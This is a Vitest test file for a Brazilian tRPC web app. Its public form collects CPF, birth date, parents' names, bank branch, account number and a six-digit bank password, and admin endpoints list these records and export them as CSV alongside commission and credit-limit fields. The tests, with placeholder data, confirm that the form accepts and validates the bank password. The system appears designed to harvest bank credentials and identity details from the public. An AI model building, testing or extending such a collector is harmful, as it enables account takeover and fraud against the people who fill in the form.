import { describe, expect, it, vi, beforeEach } from "vitest";
import { appRouter } from "./routers";
import type { TrpcContext } from "./_core/context";

// Mock the database functions
vi.mock("./db", () => ({
  createFormSubmission: vi.fn().mockResolvedValue(1),
  createCard: vi.fn().mockResolvedValue(1),
  updateFormSubmission: vi.fn().mockResolvedValue(undefined),
  getAllFormSubmissions: vi.fn().mockResolvedValue({
    submissions: [
      {
        id: 1,
        email: "test@example.com",
        telefone: "(11) 99999-9999",
        cpf: "123.456.789-09",
        dataNascimento: "01/01/1990",
        nomePai: "João Silva",
        nomeMae: "Maria Silva",
        agencia: "1234",
        conta: "12345-6",
        senha: "123456",
        sentBy: null,
        limitReturned: null,
        commissionRate: null,
        documentSentDate: null,
        limitReturnedDate: null,
        category: null,
        faturaUrl: null,
        faturaKey: null,
        faturaFilename: null,
        ocrData: null,
        ocrValidationStatus: "pending",
        cardId: null,
        submittedAt: new Date(),
        ipAddress: "127.0.0.1",
        userAgent: "test",
        createdAt: new Date(),
        updatedAt: new Date(),
      }
    ],
    total: 1
  }),
  getFormSubmissionById: vi.fn().mockResolvedValue({
    id: 1,
    email: "test@example.com",
    telefone: "(11) 99999-9999",
    cpf: "123.456.789-09",
    dataNascimento: "01/01/1990",
    nomePai: "João Silva",
    nomeMae: "Maria Silva",
    agencia: "1234",
    conta: "12345-6",
    senha: "123456",
    sentBy: null,
    limitReturned: null,
    commissionRate: null,
    documentSentDate: null,
    limitReturnedDate: null,
    category: null,
    faturaUrl: null,
    faturaKey: null,
    faturaFilename: null,
    ocrData: null,
    ocrValidationStatus: "pending",
    cardId: null,
    submittedAt: new Date(),
    ipAddress: "127.0.0.1",
    userAgent: "test",
    createdAt: new Date(),
    updatedAt: new Date(),
  }),
  getFormSubmissionsForExport: vi.fn().mockResolvedValue([
    {
      id: 1,
      email: "test@example.com",
      telefone: "(11) 99999-9999",
      cpf: "123.456.789-09",
      dataNascimento: "01/01/1990",
      nomePai: "João Silva",
      nomeMae: "Maria Silva",
      agencia: "1234",
      conta: "12345-6",
      sentBy: null,
      limitReturned: null,
      commissionRate: null,
      faturaUrl: null,
      ocrValidationStatus: "pending",
      submittedAt: new Date(),
      ipAddress: "127.0.0.1",
    }
  ]),
}));

// Mock storage
vi.mock("./storage", () => ({
  storagePut: vi.fn().mockResolvedValue({ url: "https://example.com/file.pdf", key: "faturas/test.pdf" }),
}));

// Mock notification
vi.mock("./_core/notification", () => ({
  notifyOwner: vi.fn().mockResolvedValue(true),
}));

// Mock LLM
vi.mock("./_core/llm", () => ({
  invokeLLM: vi.fn().mockResolvedValue({
    choices: [{
      message: {
        content: JSON.stringify({
          nome: "Test User",
          cpf: "123.456.789-09",
          endereco: null,
          valor: null,
          vencimento: null
        })
      }
    }]
  }),
}));

// Mock nanoid
vi.mock("nanoid", () => ({
  nanoid: vi.fn().mockReturnValue("test-id-123"),
}));

// Mock LLM
vi.mock("./_core/llm", () => ({
  invokeLLM: vi.fn().mockResolvedValue({
    choices: [{
      message: {
        content: JSON.stringify({
          nome: "Test User",
          cpf: "123.456.789-09",
          endereco: null,
          valor: null,
          vencimento: null
        })
      }
    }]
  }),
}));

function createPublicContext(): TrpcContext {
  return {
    user: null,
    req: {
      protocol: "https",
      headers: {
        "x-forwarded-for": "127.0.0.1",
        "user-agent": "test-agent"
      },
      socket: { remoteAddress: "127.0.0.1" }
    } as TrpcContext["req"],
    res: {
      clearCookie: vi.fn(),
    } as unknown as TrpcContext["res"],
  };
}

function createAdminContext(): TrpcContext {
  return {
    user: {
      id: 1,
      openId: "admin-user",
      email: "admin@example.com",
      name: "Admin User",
      loginMethod: "manus",
      role: "admin",
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
    },
    req: {
      protocol: "https",
      headers: {},
    } as TrpcContext["req"],
    res: {
      clearCookie: vi.fn(),
    } as unknown as TrpcContext["res"],
  };
}

function createUserContext(): TrpcContext {
  return {
    user: {
      id: 2,
      openId: "regular-user",
      email: "user@example.com",
      name: "Regular User",
      loginMethod: "manus",
      role: "user",
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
    },
    req: {
      protocol: "https",
      headers: {},
    } as TrpcContext["req"],
    res: {
      clearCookie: vi.fn(),
    } as unknown as TrpcContext["res"],
  };
}

describe("form.submit", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("should submit form with valid data", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);

    const result = await caller.form.submit({
      email: "test@example.com",
      telefone: "(11) 99999-9999",
      cpf: "529.982.247-25", // Valid CPF
      dataNascimento: "01/01/1990",
      nomePai: "João Silva",
      nomeMae: "Maria Silva",
      agencia: "1234",
      conta: "12345-6",
      senha: "123456",
    });

    expect(result.success).toBe(true);
    expect(result.submissionId).toBe(1);
    expect(result.message).toBe("Formulário enviado com sucesso!");
  });

  it("should reject invalid CPF", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);

    await expect(caller.form.submit({
      email: "test@example.com",
      telefone: "(11) 99999-9999",
      cpf: "111.111.111-11", // Invalid CPF (all same digits)
      dataNascimento: "01/01/1990",
      nomePai: "João Silva",
      nomeMae: "Maria Silva",
      agencia: "1234",
      conta: "12345-6",
      senha: "123456",
    })).rejects.toThrow();
  });

  it("should reject invalid email", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);

    await expect(caller.form.submit({
      email: "invalid-email",
      telefone: "(11) 99999-9999",
      cpf: "529.982.247-25",
      dataNascimento: "01/01/1990",
      nomePai: "João Silva",
      nomeMae: "Maria Silva",
      agencia: "1234",
      conta: "12345-6",
      senha: "123456",
    })).rejects.toThrow();
  });

  it("should reject invalid password (not 6 digits)", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);

    await expect(caller.form.submit({
      email: "test@example.com",
      telefone: "(11) 99999-9999",
      cpf: "529.982.247-25",
      dataNascimento: "01/01/1990",
      nomePai: "João Silva",
      nomeMae: "Maria Silva",
      agencia: "1234",
      conta: "12345-6",
      senha: "12345", // Only 5 digits
    })).rejects.toThrow();
  });
});

describe("admin.listSubmissions", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("should list submissions for admin user", async () => {
    const ctx = createAdminContext();
    const caller = appRouter.createCaller(ctx);

    const result = await caller.admin.listSubmissions({
      limit: 10,
      offset: 0,
    });

    expect(result.submissions).toHaveLength(1);
    expect(result.total).toBe(1);
  });

  it("should reject non-admin users", async () => {
    const ctx = createUserContext();
    const caller = appRouter.createCaller(ctx);

    await expect(caller.admin.listSubmissions({
      limit: 10,
      offset: 0,
    })).rejects.toThrow("Acesso negado");
  });

  it("should reject unauthenticated users", async () => {
    const ctx = createPublicContext();
    const caller = appRouter.createCaller(ctx);

    await expect(caller.admin.listSubmissions({
      limit: 10,
      offset: 0,
    })).rejects.toThrow();
  });
});

describe("admin.getSubmission", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("should get submission details for admin", async () => {
    const ctx = createAdminContext();
    const caller = appRouter.createCaller(ctx);

    const result = await caller.admin.getSubmission({ id: 1 });

    expect(result.id).toBe(1);
    expect(result.email).toBe("test@example.com");
  });
});

describe("admin.exportSubmissions", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("should export submissions as CSV for admin", async () => {
    const ctx = createAdminContext();
    const caller = appRouter.createCaller(ctx);

    const result = await caller.admin.exportSubmissions();

    expect(result.csv).toContain("ID,Email,Telefone");
    expect(result.filename).toContain("submissoes-");
    expect(result.count).toBe(1);
  });
});
